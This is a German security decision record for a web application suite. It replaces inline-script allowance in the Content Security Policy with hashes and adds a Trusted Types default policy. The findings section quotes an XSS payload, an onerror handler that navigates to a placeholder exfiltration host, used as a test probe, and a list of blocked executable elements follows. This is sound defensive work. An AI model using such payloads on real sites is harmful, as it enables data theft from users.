# U2-ADR-470 · Skripte nur noch per Hash: CSP ohne 'unsafe-inline', Trusted Types als zweite Wand

**Status:** Angenommen (19.10.2026)
**Datum:** 17.10.2026 (Fassung; erster Bau vom 01.10.2026 nicht gelandet, neu aufgesetzt auf dem Kanon d1ab125e2)
**Kategorie:** SICHERHEIT
**Status heute:** gilt seit 19.10.2026 — Belege im `konformitaet`-Block unten
**Betrifft:** alle HTML-Anwendungen (`vivodepot.html`, `vivodepot-lesen.html`, `vivodepot-studio.html`,
`vivodepot-vc-issuer.html`, `vivodepot-schluessel-teilen.html`); `tools/csp-bauen.js`, `tools/lib/csp-hashes.js` (unverändert),
`tools/lib/vertrauensregel-block.js`, `tools/lib/csp-nach-bau.js`, `tools/lib/csp-beim-schreiben.js`; jeder Bauweg, der nach
dem Bau Blöcke einsetzt oder schneidet (Liste unter Entscheidung 1).
**Bezug:** B16-ADR-066 §5 (CSP mit `'unsafe-inline'`; für `script-src` mit Annahme dieser Entscheidung abgelöst), U2-ADR-494
(Test-Fläche und Entwicklerleiste werden im Erzeugnis geschnitten), die HTML-Senken-Grundlinie (`tools/html-senken-grundlinie.json`).
Befunde KERN-CSP-UNSAFE-INLINE-NAVIGATION und STUDIO-UNSAFE-INLINE (beide MITTEL), PDF-VORSCHAU-VON-CSP-BLOCKIERT.

## Frage

Die Anwendungen erlaubten `script-src 'self' 'unsafe-inline'` (Lese-App, Aussteller, Schlüssel-Teilen ohne `'self'`).
`connect-src 'none'` verbietet Netzwerkaufrufe aus dem Skript, aber keine Navigation. Was läuft, wenn fremdes HTML doch einmal
in eine Senke gerät?

## Befund (gemessen am 17.10.2026, Kanon d1ab125e2)

- Ein per DOM eingesetztes `<img src=x onerror="location.href='https://abfluss.invalid/?d=probe'">` lief in `vivodepot.html`
  über `file://` in Chromium, Firefox und WebKit: `innerHTML` angenommen, je Engine eine Abfluss-Anfrage. Nachsehen: die Probe
  `tests/konformitaet/csp-exploit.mjs` zeigt denselben Abfluss als Rot-Beweis gegen die alte CSP (für Kern, Lese-App und ein
  konfektioniertes Produkt); die CSP des Kanons mit `git show d1ab125e2:vivodepot.html | grep -o "script-src[^;\"]*"`.
- Die Voraussetzung ist eine HTML-Senke, in die fremdes HTML gelangt. Die Senken sind begründet gezählt
  (`tools/html-senken-grundlinie.json`); die CSP ist die zweite Schicht dahinter, und sie fehlte.
- Keine Anwendung trägt einen Inline-Handler oder eine `javascript:`-Adresse, weder im Markup noch in Zeichenketten, die als HTML
  eingesetzt werden. Nachsehen: `tests/inline-csp-ohne-unsafe-inline.test.js`. Damit braucht es weder `'unsafe-hashes'` noch einen
  Umbau auf `addEventListener`.
- Das Download-Gateway ist vorbereitet: es trägt eine byte-gleiche Kopie des Abschnitts CSP_HASHES (in seinem eigenen Repository) und zieht
  in `cspNachBau` die Hashes nach, sobald der Kern sie trägt. Der Kern kann allein umsteigen; der Abschnitt in
  `tools/lib/csp-hashes.js` bleibt byte-gleich. Nachsehen: `tests/csp-hashes-cross-repo-abgleich.test.js`.

## Entscheidung

1. **`script-src` mit Hashes statt `'unsafe-inline'`.**
   - Jeder eigene ausführbare Inline-Block (ohne `src`, ohne Daten-Typ) steht als `'sha256-…'` in der CSP-Zeile. Wo `'self'`
     stand, bleibt es (Kern: Service Worker, Vor-Depot-Konfiguration; Studio); wo es nicht stand, kommt es nicht dazu.
   - Der Bau schreibt die Hashes (`node tools/csp-bauen.js`), nie die Hand; `--check` ist rot, wenn eine Datei nicht dem Bau
     entspricht. Die Landungs-Vorbereitung fährt das Werkzeug nach dem letzten Schritt, der in eine Anwendung schreibt, und
     vor dem ersten, der einen Zustand des Kerns festschreibt.
   - Jeder Weg, der nach dem Bau Blöcke einsetzt oder schneidet, zieht die Hashes als letzten Schritt nach, vor Prüfsumme und
     Signatur (`cspNachBau`, `tools/lib/csp-nach-bau.js`): die Auslieferung des Kerns (`_produktBauen`),
     `tools/produkt-konfektionieren.js` (Produkt und Sub-Depot-Palette; damit `vier-produkte-erzeugen`, `pro-zuschnitt-bauen`,
     die Website-Kette), `tools/lib/pages-erzeugnis.js` (beide Pages-Wege; damit `testfassung-legen`, `modul-app-packen`),
     die Demo (jede Seite, auch die Lese-App), `tools/vorfuehrung-showcase-erzeugen.js`,
     `tools/stick-ausgabe-backen.js`, der Durchklick-Abnahmelauf (Testfassung) und die Kampagnen-Messung (Messprodukt).
     Das Download-Gateway tut dasselbe mit seiner Kopie des Abschnitts.
   - Dieselbe Regel wie im Gateway: trägt eine Datei noch `'unsafe-inline'`, bleibt sie unverändert. Ein älterer Kern (A/B-Abnahmen
     gegen frühere Fassungen) bekommt keine Hashes untergeschoben.
2. **Trusted Types als zweite Wand.**
   - `require-trusted-types-for 'script'` und `trusted-types default`.
   - Eine Default-Policy als erstes Skript jeder Anwendung, byte-gleich überall (`tools/lib/vertrauensregel-block.js`). Sie reicht
     nichts ungeprüft durch. Abgelehnt wird HTML mit ausführbarem Anteil: Ereignis-Attribute, `srcdoc`, `javascript:`/`vbscript:`
     auch kodiert, die Elemente `script`, `iframe`, `frame`, `frameset`, `object`, `embed`, `applet`, `base`, `meta`, `link`,
     `portal`, `noscript`, `noembed`, `noframes`, `xmp`, `plaintext`, und Markup im Rohtext von `style`/`textarea`/`title`.
     Gelesen wird wie vom HTML-Tokenizer; wo HTML und SVG/MathML verschieden lesen, gilt die strengere Lesart.
   - Skript-Adressen nur `sw.js` (`navigator.serviceWorker.register`, Kern) und `./vorabkonfiguration.js`
     (`VOR_DEPOT_KONFIGURATION_PFAD`, Kern). Skript aus Text nie.
   - Benannte Policies: keine. Keine eigene Stelle setzt bewusst ausführbares HTML.
   - Gegenüber dem Bau vom 01.10.2026 fällt die Ausnahme für einen `<iframe>` der PDF-Vorschau weg: den Rahmen gibt es seit
     15.10.2026 nicht mehr (PDF-VORSCHAU-VON-CSP-BLOCKIERT). Ein künftiger Rahmen braucht eine eigene Entscheidung.
   - Die SVG-Prüfung der Ausgabe (`_svgAktivDom`, `DOMParser` ist eine Trusted-Types-Senke) wertet eine Ablehnung durch die
     Vertrauensregel als Fund, nicht als Rückfall auf die Textsuche.
3. **Testumgebung.** Browser-Proben, die eine abgeänderte Kopie schreiben, bekommen die passenden Hashes beim Schreiben
   (`tools/lib/csp-beim-schreiben.js`, eingehängt in jeder Playwright-Konfiguration), aber nur, wenn deren CSP schon ohne
   `'unsafe-inline'` steht. Eine Kopie mit alter CSP bleibt alt.

## Was diese Entscheidung nicht leistet

- `style-src 'unsafe-inline'` bleibt (`grep -o 'style="' vivodepot.html | wc -l`: über 200). Fremdes CSS führt keinen Code
  aus; ein eigener Posten.
- Ein Browser ohne Trusted Types hat nur die erste Wand. Hash-Quellen in `script-src` gehören zu CSP Level 2 und tragen allein:
  ein Handler läuft nicht, egal wie er ins DOM kommt (die Exploit-Probe misst das je Engine an einer Fassung ohne Trusted Types).
- Die HTML-Senken bleiben, wie sie sind. Die Default-Policy prüft an ihnen; ein Umbau auf benannte Policies je Senke ist nicht
  Teil dieser Entscheidung.
- `frame-ancestors` wirkt weiterhin nur als HTTP-Kopf; ob das Gateway die CSP als Kopf setzt, entscheidet die Kopf-Probe
  (`tests/e2e/csp-kopf-mappe-vorschau.spec.js`), nicht diese Entscheidung.
- Begleitseiten, die keine Anwendung sind (Startseite einer Demo, Weiterleitungen, Landeseiten), behalten ihre eigene CSP.

```yaml
konformitaet:
  - aussage: >-
      Keine HTML-Anwendung erlaubt script-src 'unsafe-inline'; jeder eigene Inline-Block ist per sha256 erlaubt, und
      die Hashliste stimmt genau mit den Blöcken überein.
    zustand: erfuellt
    herkunft: U2-ADR-470 (17.10.2026)
    pruefung:
      - tests/csp-hashes-vertrauensregel.test.js
        "[CSP·Werkzeug] csp-bauen --check ist grün über alle Anwendungen"
      - tests/csp-hashes-vertrauensregel.test.js
        "[CSP] jede Anwendung entspricht dem Bau: Hashes statt unsafe-inline, Trusted Types, Vertrauensregel als erstes Skript"
      - tests/inline-csp-ohne-unsafe-inline.test.js
        "[Inline-CSP·Rot-Beweis] ein neuer Block ohne Hash, ein Inline-Handler, unsafe-inline: rot"
  - aussage: >-
      Jeder Bauweg, der nach dem Bau Blöcke einsetzt oder schneidet, trägt danach die passenden Hashes.
    zustand: erfuellt
    herkunft: U2-ADR-470 (17.10.2026)
    pruefung:
      - tests/csp-hashes-vertrauensregel.test.js
        "[CSP·Bauwege] konfektionieren, Pages (beide Wege), Stick und Vorführung: die CSP passt genau zu den Blöcken"
      - tests/csp-hashes-vertrauensregel.test.js
        "[CSP·Bauwege] jeder Weg, der Blöcke einsetzt, ruft das Nachziehen auf — gelesen aus der Quelle"
  - aussage: >-
      Die Default-Policy lehnt ausführbares HTML ab, lässt harmloses durch und erlaubt Skript-Adressen nur aus der
      festen Liste.
    zustand: erfuellt
    herkunft: U2-ADR-470 (17.10.2026)
    pruefung:
      - tests/csp-hashes-vertrauensregel.test.js
        "[Vertrauensregel] lehnt ausführbares HTML ab — auch die bekannten Umgehungen"
      - tests/csp-hashes-vertrauensregel.test.js
        "[Vertrauensregel] lässt harmloses HTML unverändert durch — Text außerhalb von Tags und Attributwerte zählen nicht"
      - tests/csp-hashes-vertrauensregel.test.js
        "[Vertrauensregel] Skript-Adressen nur aus der festen Liste, Skript aus Text nie"
  - aussage: >-
      Der Abfluss-Exploit läuft in Chromium, Firefox und WebKit in keiner Anwendung und keinem konfektionierten Produkt;
      mit der alten CSP läuft er (Rot-Beweis).
    zustand: erfuellt
    herkunft: U2-ADR-470 (17.10.2026)
    pruefung:
      - tests/konformitaet/csp-exploit.mjs
      - tests/konformitaet/csp-exploit-firefox.mjs
      - tests/konformitaet/csp-exploit-webkit.mjs
        "] der Abfluss-Exploit läuft in keiner Anwendung, harmloses HTML schon — Rot-Beweis mit der alten CSP"
```
